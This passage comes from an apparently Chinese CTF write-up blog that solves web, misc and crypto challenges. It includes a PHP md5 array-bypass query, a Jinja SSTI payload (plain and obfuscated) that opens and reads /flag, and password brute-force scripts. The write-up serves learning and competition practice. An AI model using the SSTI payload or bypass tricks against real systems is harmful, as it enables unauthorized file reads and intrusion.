/></p>\n<h3 id=\"web4\"><a class=\"anchor\" href=\"#web4\">#</a> web4</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDQv\">http://101.133.134.12:8004/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444663/Typera/2023/04/2cbdf0994890977a091df5ca11120743.png\" alt=\"image-20220609221821224\" /></p>\n<p>扫一下可以看到源码备份的 index.php.bak, 得到下面源码</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;姓名与密码不能一致!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">       &#125;<span class=\"keyword\">elseif</span>(<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">&#x27;密码不能是纯数字&#x27;</span>);</span><br><span class=\"line\">       &#125;<span class=\"keyword\">elseif</span> (<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>]) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"variable\">$key</span>);&#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;无效密码&lt;/p&gt;&#x27;</span>;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;首次登陆!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>需要账号密码的值不能相等，也不能为纯数字，但是最后 md5 值相等</p>\n<p>经典的 md5 绕过问题，这个可以用 md5 强碰撞也可以用数组使得 md5 函数出错返回 False</p>\n<p>这里我选择直接用数组绕过使得 md5 函数出错返回 False 即可绕过获取 flag</p>\n<p>?name[]=1&amp;pwd[]=1</p>\n<p>得到 flag:</p>\n<p>FDA095FC516DA9AE2A15AB135BFF8C80</p>\n<h3 id=\"web5\"><a class=\"anchor\" href=\"#web5\">#</a> web5</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDUv\">http://101.133.134.12:8005/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/45b7a99411b7284e79ecc93b545cba46.png\" alt=\"image-20220609221148060\" /></p>\n<p>控制面板显示是个 tabib 框架，但是上网找相关漏洞没有任何发现，网站的页面到处点也没发现可利用点，文件上传和新建数据什么的实际上不会发包执行，但是在日历版块有异常，访问会返回下面这句话但是</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444665/Typera/2023/04/dfcdddcfc40379b8f4ed863db11fc3bd.png\" alt=\"image-20220609211231533\" /></p>\n<p>猜测问题是出在这里，但是不知道漏洞点在哪里，最后开了个扫描发现一个 console 接口，进去发现是一个 Flask 后台，想到计算 Pin 码但是并不可行，最后发现在日历接口有 SSTI, 使用 SSTI 获取 /flag</p>\n<p>通过内置模块获取 open 函数打开 /flag 并通过 read 得到文件内容</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[64].__init__.__globals__.__builtins__.open(&#x27;/flag&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>变化一下就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://101.133.134.12:8005/&#123;&#123;&#x27;&#x27;[request.values.c][request.values.m][-1][request.values.s]()[64][request.values.i][request.values.g][request.values.b][request.values.o](request.values.file,&#x27;r&#x27;)[request.values.r]() &#125;&#125;&amp;c=__class__&amp;m=__mro__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;b=__builtins__&amp;o=open&amp;r=read&amp;file=/flag</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"web6\"><a class=\"anchor\" href=\"#web6\">#</a> web6</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDYv\">http://101.133.134.12:8006/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444665/Typera/2023/04/86078170c086e4be0e3c19618dfdbd0f.png\" alt=\"image-20220609222553452\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/40d9dc8e7b8a4958999cf8472e8e3a44.png\" alt=\"image-20220609222805556\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/e667aae1d40eb237c602fe151a73a56c.png\" alt=\"image-20220609222758667\" /></p>\n<p>再次陷入谜语人状态，这个最后还是没出来，不过水群看到说是摁爆破 (原本想过爆破的，不过前两天刚把垃圾字典删了就没爆...)，最后 password 和 hash 为 admin@123 的对应值的时候就会得到存 flag 的文件 gettf1ag.php, 访问就有 flag</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"misc1\"><a class=\"anchor\" href=\"#misc1\">#</a> misc1</h3>\n<p>给的文件后缀名是 .bat，010 打开发现，实际上应该是个 ppt（有很明显的 PowerPoint 字符），<br />\n更改后缀名为 ppt 之后，wps 打开，发现需要密码。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444758/Typera/2023/04/8a2cd7f40020deec0fb07a490c84beb6.png\" alt=\"image-20230426014555010\" /></p>\n<p>在用 notepad 查看的时候，翻阅过程中突然看到提示：密码为 4 位纯数字</p>\n<p>使用脚本生成字典后直接爆破：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 字典生成</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools <span class=\"keyword\">as</span> its</span><br><span class=\"line\">words = <span class=\"string\">&quot;1234568790&quot;</span></span><br><span class=\"line\">r =its.product(words,repeat=<span class=\"number\">4</span>)</span><br><span class=\"line\">dic = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;pass1.txt&quot;</span>,<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> r:</span><br><span class=\"line\">    dic.write(<span class=\"string\">&quot;&quot;</span>.join(i))</span><br><span class=\"line\">    dic.write(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"string\">&quot;\\n&quot;</span>))</span><br><span class=\"line\">dic.close()</span><br></pre></td></tr></table></figure><br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 爆破</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32com.client</span><br><span class=\"line\"><span class=\"keyword\">import</span> pywintypes</span><br><span class=\"line\">passw=[]</span><br><span class=\"line\">dic = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;pass1.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">data=dic.readline().strip(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> data:</span><br><span class=\"line\">    passw.append(data);</span><br><span class=\"line\">    data=dic.readline().strip(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">dic.close();</span><br><span class=\"line\">wps1=win32com.client.Dispatch(<span class=\"string\">&#x27;Kwps.application&#x27;</span>)</span><br><span class=\"line\">wps1.Visible=<span class=\"literal\">True</span></span><br><span class=\"line\">wps1.DisplayAlerts = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> passw:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        d=wps1.Documents.Open(<span class=\"string\">r&#x27;C:\\Users\\Sycamore\\Desktop\\CTF\\flag去哪了.ppt&#x27;</span>,PasswordDocument=i);</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pywintypes.com_error:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;succcccceesss&quot;</span>+i)</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"misc2\"><a class=\"anchor\" href=\"#misc2\">#</a> misc2</h3>\n<p>binwalk 分离，得到了很多文件，依次打开，查看文件内容，<br />\n其中一个文件：3BD12，<br />\n打开后获得一串 base64：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444751/Typera/2023/04/768eee297663a9e32fc4fc496cac6f97.png\" alt=\"image-20230426014548136\" /></p>\n<p>两次 base64 解码后，就能得到 flag</p>\n<h3 id=\"misc3\"><a class=\"anchor\" href=\"#misc3\">#</a> misc3</h3>\n<p>打开听了一下，感觉像 SSTV（今年 Misc 考这个的还真不少...），<br />\n安卓端使用 robot36 解码，<br />\n获得图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444746/Typera/2023/04/f51ed89d71155cbcda0bfc8f6e732d98.png\" alt=\"image-20230426014542237\" /></p>\n<h3 id=\"misc4\"><a class=\"anchor\" href=\"#misc4\">#</a> misc4</h3>\n<p>010 打开后文件末尾看到提示为：lsb<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444738/Typera/2023/04/a0b423aba3dce71da97e7ff584b46211.png\" alt=\"image-20230426014535850\" /></p>\n<p>stegsolve 打开后查看通道，发现 R G B 的 0 通道都有异常，<br />\n提取数据得到一张 jfif 图片如下，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444733/Typera/2023/04/1f50a00f8fc8a07fc7bab3299c06a3cd.png\" alt=\"image-20230426014529631\" /></p>\n<p>010 打开新图片，发现文件中间的 base64，解码得到 flag<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444726/Typera/2023/04/6a15b005d94435c94b76898f2f6b43c5.png\" alt=\"image-20230426014522816\" /></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"crypto1\"><a class=\"anchor\" href=\"#crypto1\">#</a> Crypto1</h3>\n<p>观察其结构为 base 系列加密</p>\n<p>base64 解密后得到密文 K5WTCNDBIZXXUZCHGFHWC22VO5LVO4CDMFCTCNSVKRHGCUSHJV5FI22SJNQUM4CIKJKFET2SGFVXUV2WMRHGKVTMLBJVIQSOMFVVK6CUGBTXOUCRHU6Q====，base64 最多有两个 = 号并且其全为大写，故是 base32 编码，之后又经过两层 base64 解码。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/cdefdc67d556d6eab98241c52fffe5c3.png\" alt=\"image-20220608110331959\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">c=<span class=\"string\">&#x27;SzVXVENOREJJWlhYVVpDSEdGSFdDMjJWTzVMVk80Q0RNRkNUQ05TVktSSEdDVVNISlY1RkkyMlNKTlFVTTRDSUtKS0ZFVDJTR0ZWWFVWMldNUkhHS1ZUTUxCSlZJUVNPTUZWVks2Q1VHQlRYT1VDUkhVNlE9PT09&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(c))</span><br><span class=\"line\">c1=<span class=\"string\">&#x27;K5WTCNDBIZXXUZCHGFHWC22VO5LVO4CDMFCTCNSVKRHGCUSHJV5FI22SJNQUM4CIKJKFET2SGFVXUV2WMRHGKVTMLBJVIQSOMFVVK6CUGBTXOUCRHU6Q====&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b32decode(c1))</span><br><span class=\"line\">c2=<span class=\"string\">&#x27;Wm14aFozdG1OakUwWWpCaE16UTNaRGMzTkRKaFpHRTROR1kzWVdNeVlXSTBNakUxT0gwPQ==&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(c2))</span><br><span class=\"line\">c3=<span class=\"string\">&#x27;ZmxhZ3tmNjE0YjBhMzQ3ZDc3NDJhZGE4NGY3YWMyYWI0MjE1OH0=&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(c3))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;f614b0a347d7742ada84f7ac2ab42158&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"crypto2\"><a class=\"anchor\" href=\"#crypto2\">#</a> Crypto2</h3>\n<p>首先题目提示凯撒加密，但是其中有 +、(、? 等特殊字符，尝试 26 以内的偏移，或和 flag {和 Zmxh (flag 的 base64 编码) 算移位没有发现规律。</p>\n<p>尝试在 0-128 内唯一，打印其中可显示的明文字符串。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=<span class=\"string\">b&#x27;Nd(+X=fqZqEEM&lt;bpKegNYMg?NdkEDcAkKLIaEL(LHdcFM\\&#x27;c*Nc[QEMchP*gFM=c-NM^n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">    m=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">        m.append((s[j]-i)%<span class=\"number\">128</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;shfit: %d&#x27;</span>%i,<span class=\"built_in\">bytes</span>(m).decode())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>打印结果如下</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/95583e673986ca8fb15a052c62d8b6d8.png\" alt=\"image-20220608110941375\" /></p>\n<p>在 shfit 的偏移为 119 时发现一个可疑的明文信息，尝试 base64 解密。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/c1f50a879e27e33a64a8e8f5b722b870.png\" alt=\"image-20220608111119812\" /></p>\n<p>发现两次解密后即为 flag，完整代码如下。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">s=<span class=\"string\">b&#x27;Nd(+X=fqZqEEM&lt;bpKegNYMg?NdkEDcAkKLIaEL(LHdcFM\\&#x27;c*Nc[QEMchP*gFM=c-NM^n&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">for i in range(128):</span></span><br><span class=\"line\"><span class=\"string\">    m=[]</span></span><br><span class=\"line\"><span class=\"string\">    for j in range(len(s)):</span></span><br><span class=\"line\"><span class=\"string\">        m.append((s[j]-i)%128)</span></span><br><span class=\"line\"><span class=\"string\">    print(&#x27;shfit: %d&#x27;%i,bytes(m).decode())</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(<span class=\"string\">&#x27;Wm14aFozczNNVEkyTnpWbVpHWmtNMlJtTURjNU1UQmlOV0l3WldZNVlqY3pOVFl6WVgw&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(<span class=\"string\">&#x27;ZmxhZ3s3MTI2NzVmZGZkM2RmMDc5MTBiNWIwZWY5YjczNTYzYX0=&#x27;</span>))</span><br><span class=\"line\">m=<span class=\"string\">&#x27;flag&#123;712675fdfd3df07910b5b0ef9b73563a&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"crypto3\"><a class=\"anchor\" href=\"#crypto3\">#</a> Crypto3</h3>\n<p>RSA 公钥加密，题目附件中包括 c、n、e，但是 e 比较小且是偶数，故考察方向为 e 和 phin 不互素，尝试用 yafu 分解 n。</p>\n<p>等待一段时间后 n 被成功分解，如下图。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/11e61701c1ca00d8a3f8593f77dadbf6.png\" alt=\"image-20220608111541593\" /></p>\n<p>得到 p 和 q 后就可以求私钥，但是 (e,phi)=4, 故无逆元，那么根据 m^e mod n 可以变为 (m<sup>4)</sup>(e/4) 这样 e/4 和 phi 便互素，但是这样 c^d mod n 后得到的为 m^4 mod n，直接用 iroot 尝试开 4 次方，最后转为字符即发现 flag。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">n = <span class=\"number\">22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311</span></span><br><span class=\"line\">e = <span class=\"number\">180</span></span><br><span class=\"line\">c = <span class=\"number\">17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559</span></span><br><span class=\"line\">p=<span class=\"number\">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527</span></span><br><span class=\"line\">q=<span class=\"number\">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993</span></span><br><span class=\"line\">phi=(p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">e=e//gmpy2.gcd(e,phi)</span><br><span class=\"line\">d=gmpy2.invert(e,phi)</span><br><span class=\"line\">m4=<span class=\"built_in\">pow</span>(c,d,n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(gmpy2.iroot(m4,<span class=\"number\">4</span>)[<span class=\"number\">0</span>]))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;09dfc77eaebb50f136fc184533b9d556&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"crypto4\"><a class=\"anchor\" href=\"#crypto4\">#</a> Crypto4</h3>\n<p>拿到附件发现是自己实现的 ADFGVX 加密，key 已知是 ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8，但是 keyword 未知。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getKeyword</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    key = <span class=\"string\">&#x27;&#x27;</span>.join([choice(<span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(x)])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> key.count(i)!=<span class=\"number\">1</span>: <span class=\"comment\">#只有一种</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> getKeyword(x)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> key</span><br><span class=\"line\">keyword = getKeyword(<span class=\"number\">7</span>)</span><br></pre></td></tr></table></figure></p>\n<p>根据关键字的生成算法可知是在字母表中选取 7 个不同的字符，如果要爆破则有 26*25*24*23*22*21*20=3315312000 组合，在比赛时间内应该不行，故要根据 ADFGVX 原理来解决该题。</p>\n<p>百度得知加密步骤如下。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/015954e81f3f5c183a376d48e8cebdf3.png\" alt=\"image-20220608114533949\" /></p>\n<p>上图是 5X5 的 ADFGX 而本题是 ADFGVX 是前者的进阶版本，所以 key 是 6x6 的矩阵，并且置换之后通过 key 来进行移位加密。</p>\n<p>得知原理后继续看脚本</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encipher_char</span>(<span class=\"params\">self, ch, size=<span class=\"number\">6</span>, chars=<span class=\"string\">&#x27;ADFGVX&#x27;</span></span>):</span><br><span class=\"line\">    row = (<span class=\"built_in\">int</span>)(self.key.index(ch)/size) <span class=\"comment\">#第几行</span></span><br><span class=\"line\">    col = (self.key.index(ch) % size)    <span class=\"comment\">#第几列</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> chars[row] + chars[col]  <span class=\"comment\">#行列替换      </span></span><br></pre></td></tr></table></figure></p>\n<p>所以我们打印出表格如下</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k=<span class=\"string\">&#x27;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(k),<span class=\"number\">6</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(k[i+j].upper(),end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">   A D F G V X </span></span><br><span class=\"line\"><span class=\"string\">A  P H 0 Q G 6 </span></span><br><span class=\"line\"><span class=\"string\">D  4 M E A 1 Y </span></span><br><span class=\"line\"><span class=\"string\">F  L 2 N O F D </span></span><br><span class=\"line\"><span class=\"string\">G  X K R 3 C V </span></span><br><span class=\"line\"><span class=\"string\">V  S 5 Z W 7 B </span></span><br><span class=\"line\"><span class=\"string\">X  J 9 U T I 8 </span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>但是直接解密是错的的并没有体现到 key 的作用，观察源码，发现 key 有处理。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">step1 = self.encipher_string(string) <span class=\"comment\">#简单置换后的结果</span></span><br><span class=\"line\">step2 = self.encipher_sortind(step1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sortind</span>(<span class=\"params\">word</span>): <span class=\"comment\">#返回key字母在排序后的字母中的位置</span></span><br><span class=\"line\">    t1 = [(word[i], i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span 